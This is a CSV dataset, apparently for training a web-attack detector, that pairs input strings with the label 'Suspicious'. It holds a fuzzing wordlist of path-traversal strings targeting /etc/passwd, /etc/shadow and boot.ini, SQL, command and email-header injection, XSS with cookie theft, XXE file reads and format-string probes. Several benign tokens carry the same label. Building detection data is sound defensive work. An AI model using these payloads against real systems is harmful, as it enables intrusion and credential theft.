WebString,Label
..%u2215,Suspicious
..%u2216,Suspicious
../,Suspicious
../../../../../../../../../../../../etc/hosts,Suspicious
../../../../../../../../../../../../etc/hosts%00,Suspicious
../../../../../../../../../../../../etc/passwd,Suspicious
../../../../../../../../../../../../etc/passwd%00,Suspicious
../../../../../../../../../../../../etc/shadow,Suspicious
../../../../../../../../../../../../etc/shadow%00,Suspicious
..\,Suspicious
..\..\..\..\..\..\..\..\..\..\etc\passwd,Suspicious
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,Suspicious
..\..\..\..\..\..\..\..\..\..\etc\shadow,Suspicious
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,Suspicious
.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd,Suspicious
.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow,Suspicious
/,Suspicious
/%00/,Suspicious
/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,Suspicious
/%2A,Suspicious
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,Suspicious
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,Suspicious
/&apos;,Suspicious
/',Suspicious
"/,%ENV,/",Suspicious
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,Suspicious
/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,Suspicious
/.../.../.../.../.../,Suspicious
/../../../../../../../../%2A,Suspicious
/../../../../../../../../../../../etc/passwd%00.html,Suspicious
/../../../../../../../../../../../etc/passwd%00.jpg,Suspicious
/../../../../../../../../../../etc/passwd,Suspicious
/../../../../../../../../../../etc/passwd^^,Suspicious
/../../../../../../../../../../etc/shadow,Suspicious
/../../../../../../../../../../etc/shadow^^,Suspicious
/../../../../../../../../bin/id|,Suspicious
/..\../..\../..\../..\../..\../..\../boot.ini,Suspicious
/..\../..\../..\../..\../..\../..\../etc/passwd,Suspicious
/..\../..\../..\../..\../..\../..\../etc/shadow,Suspicious
/./././././././././././etc/passwd,Suspicious
/./././././././././././etc/shadow,Suspicious
//,Suspicious
//*,Suspicious
/etc/passwd,Suspicious
/etc/shadow,Suspicious
/index.html|id|,Suspicious
0,Suspicious
0 or 1=1,Suspicious
0,Suspicious
0xfffffff,Suspicious
1,Suspicious
1 or 1 in (@@version)--,Suspicious
1 or 1=1--,Suspicious
1,Suspicious
1; waitfor delay '0:30:0'--,Suspicious
1;SELECT%20*,Suspicious
1||Utl_Http.request('http://<yourservername>') from dual--,Suspicious
2,Suspicious
2147483647,Suspicious
268435455,Suspicious
65536,Suspicious
:response.write 111111,Suspicious
;,Suspicious
; ping 127.0.0.1 ;,Suspicious
;/usr/bin/id\n,Suspicious
;echo 111111,Suspicious
;id,Suspicious
;id;,Suspicious
;id\n,Suspicious
;id|,Suspicious
;ls -la,Suspicious
;system('/usr/bin/id'),Suspicious
;system('cat%20/etc/passwd'),Suspicious
;system('id'),Suspicious
;|/usr/bin/id|,Suspicious
<,Suspicious
<  script > < / script>,Suspicious
<!,Suspicious
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>,Suspicious
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>,Suspicious
</foo>,Suspicious
<<,Suspicious
<<<,Suspicious
"<<script>alert(""XSS"");//<</script>",Suspicious
"<>""'%;)(&+",Suspicious
<?,Suspicious
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]><foo>&xxe;</foo>",Suspicious
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/passwd"">]><foo>&xxe;</foo>",Suspicious
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/shadow"">]><foo>&xxe;</foo>",Suspicious
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xxe;</foo>",Suspicious
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>",Suspicious
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",Suspicious
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>",Suspicious
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",Suspicious
"<IMG DYNSRC=""javascript:alert('XSS')"">",Suspicious
"<IMG LOWSRC=""javascript:alert('XSS')"">",Suspicious
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",Suspicious
"<IMG SRC=""jav   ascript:alert('XSS');"">",Suspicious
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",Suspicious
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",Suspicious
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",Suspicious
"<IMG SRC=""javascript:alert('XSS')""",Suspicious
"<IMG SRC=""javascript:alert('XSS');"">",Suspicious
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,Suspicious
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,Suspicious
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,Suspicious
<IMG SRC=JaVaScRiPt:alert('XSS')>,Suspicious
"<IMG SRC=`javascript:alert(""'XSS'"")`>",Suspicious
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,Suspicious
<IMG SRC=javascript:alert('XSS')>,Suspicious
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",Suspicious
<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>,Suspicious
<IMG%20SRC='javasc      ript:alert(document.cookie)'>,Suspicious
<IMG%20SRC='javascript:alert(document.cookie)'>,Suspicious
<foo></foo>,Suspicious
"<name>','')); phpinfo(); exit;/*</name>",Suspicious
"<script>alert(""XSS"")</script>",Suspicious
<script>alert(document.cookie)</script>,Suspicious
"<xml ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:alert('XSS')""&gt;</B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",Suspicious
"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>",Suspicious
"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",Suspicious
<xss><script>alert('XSS')</script></vulnerable>,Suspicious
<youremail>%0aBcc:<youremail>,Suspicious
<youremail>%0aCc:<youremail>,Suspicious
<youremail>%0d%0aBcc:<youremail>,Suspicious
<youremail>%0d%0aCc:<youremail>,Suspicious
=,Suspicious
=',Suspicious
=--,Suspicious
=;,Suspicious
>,Suspicious
?x=,Suspicious
"?x=""",Suspicious
?x=>,Suspicious
?x=|,Suspicious
@&apos;,Suspicious
@',Suspicious
@*,Suspicious
@variable,Suspicious
A,Suspicious
ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|,Suspicious
FALSE,Suspicious
NULL,Suspicious
PRINT,Suspicious
PRINT @@variable,Suspicious
TRUE,Suspicious
XXXXX.%p,Suspicious
"XXXXX`perl -e 'print "".%p"" x 80'`",Suspicious
[&apos;],Suspicious
['],Suspicious
\,Suspicious
"\"";alert('XSS');//",Suspicious
"\""blah",Suspicious
\&apos;,Suspicious
\',Suspicious
\..\..\..\..\..\..\..\..\..\..\etc\passwd,Suspicious
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,Suspicious
\..\..\..\..\..\..\..\..\..\..\etc\shadow,Suspicious
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,Suspicious
\0,Suspicious
\00,Suspicious
\00\00,Suspicious
\00\00\00,Suspicious
\0\0,Suspicious
\0\0\0,Suspicious
\\,Suspicious
\\&apos;/bin/cat%20/etc/passwd\\&apos;,Suspicious
\\&apos;/bin/cat%20/etc/shadow\\&apos;,Suspicious
\\/,Suspicious
\\\\*,Suspicious
\\\\?\\,Suspicious
\n/bin/ls -al\n,Suspicious
\n/usr/bin/id;,Suspicious
\n/usr/bin/id\n,Suspicious
\n/usr/bin/id|,Suspicious
\nid;,Suspicious
\nid\n,Suspicious
\nid|,Suspicious
\nnetstat -a%\n,Suspicious
\t,Suspicious
\u003C,Suspicious
\u003c,Suspicious
\x23,Suspicious
\x27,Suspicious
\x27UNION SELECT,Suspicious
\x27\x4F\x52 SELECT *,Suspicious
\x27\x6F\x72 SELECT *,Suspicious
\x3C,Suspicious
\x3D \x27,Suspicious
\x3D \x3B',Suspicious
\x3c,Suspicious
^&apos;,Suspicious
^',Suspicious
`,Suspicious
`/usr/bin/id`,Suspicious
`dir`,Suspicious
`id`,Suspicious
"`perl -e 'print "".%p"" x 80'`%n",Suspicious
`ping 127.0.0.1`,Suspicious
a);/usr/bin/id,Suspicious
a);/usr/bin/id;,Suspicious
a);/usr/bin/id|,Suspicious
a);id,Suspicious
a);id;,Suspicious
a);id|,Suspicious
a)|/usr/bin/id,Suspicious
a)|/usr/bin/id;,Suspicious
a)|id,Suspicious
a)|id;,Suspicious
a;/usr/bin/id,Suspicious
a;/usr/bin/id;,Suspicious
a;/usr/bin/id|,Suspicious
a;id,Suspicious
a;id;,Suspicious
a;id|,Suspicious
http://<yourservername>/,Suspicious
id%00,Suspicious
id%00|,Suspicious
insert,Suspicious
like,Suspicious
limit,Suspicious
null,Suspicious
or,Suspicious
or 0=0 #,Suspicious
or 0=0 --,Suspicious
or 1=1--,Suspicious
or%201=1,Suspicious
or%201=1 --,Suspicious
response.write 111111,Suspicious
something%00html,Suspicious
update,Suspicious
x' or 1=1 or 'x'='y,Suspicious
x' or name()='username' or 'x'='y,Suspicious
xsstest,Suspicious
"xsstest%00""<>'",Suspicious
{&apos;},Suspicious
|/usr/bin/id,Suspicious
|/usr/bin/id|,Suspicious
|id,Suspicious
|id;,Suspicious
|id|,Suspicious
|ls,Suspicious
|ls -la,Suspicious
|nid\n,Suspicious
|usr/bin/id\n,Suspicious
||,Suspicious
|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &,Suspicious
||/usr/bin/id;,Suspicious
||/usr/bin/id|,Suspicious
},Suspicious
# a wide sample of malicious input for windows targets,Suspicious
A,Suspicious
TRUE,Suspicious
FALSE,Suspicious
0,Suspicious
0,Suspicious
1,Suspicious
-1,Suspicious
1,Suspicious
-1,Suspicious
2,Suspicious
-2,Suspicious
-20,Suspicious
65536,Suspicious
268435455,Suspicious
-268435455,Suspicious
2147483647,Suspicious
0xfffffff,Suspicious
NULL,Suspicious
null,Suspicious
\0,Suspicious
\00,Suspicious
<  script > < / script>,Suspicious
%0a,Suspicious
0%,Suspicious
0%,Suspicious
\0,Suspicious
\0\0,Suspicious
\0\0\0,Suspicious
\00,Suspicious
\00\00,Suspicious
\00\00\00,Suspicious
$null,Suspicious
$NULL,Suspicious
`dir`,Suspicious
\nnetstat -a%\n,Suspicious
"\""blah",Suspicious
|dir|,Suspicious
&quot;;id&quot;,Suspicious
dir%00,Suspicious
dir%00|,Suspicious
|dir,Suspicious
|dir|,Suspicious
|/bin/ls -al,Suspicious
?x=,Suspicious
"?x=""",Suspicious
?x=|,Suspicious
?x=>,Suspicious
/boot.ini,Suspicious
ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|,Suspicious
../../boot.ini,Suspicious
/../../../../../../../../%2A,Suspicious
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%       25%5c..%25%5c..%00,Suspicious
%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%               25%5c..%25%5c..%255cboot.ini,Suspicious
/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini,Suspicious
../../../../../../../../conf/server.xml,Suspicious
C:/inetpub/wwwroot/global.asa,Suspicious
C:\inetpub\wwwroot\global.asa,Suspicious
C:/boot.ini,Suspicious
C:\boot.ini,Suspicious
../../../../../../../../../../../../localstart.asp%00,Suspicious
../../../../../../../../../../../../localstart.asp,Suspicious
../../../../../../../../../../../../boot.ini%00,Suspicious
../../../../../../../../../../../../boot.ini,Suspicious
/./././././././././././boot.ini,Suspicious
/../../../../../../../../../../../boot.ini%00,Suspicious
/../../../../../../../../../../../boot.ini,Suspicious
/..\../..\../..\../..\../..\../..\../boot.ini,Suspicious
/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini,Suspicious
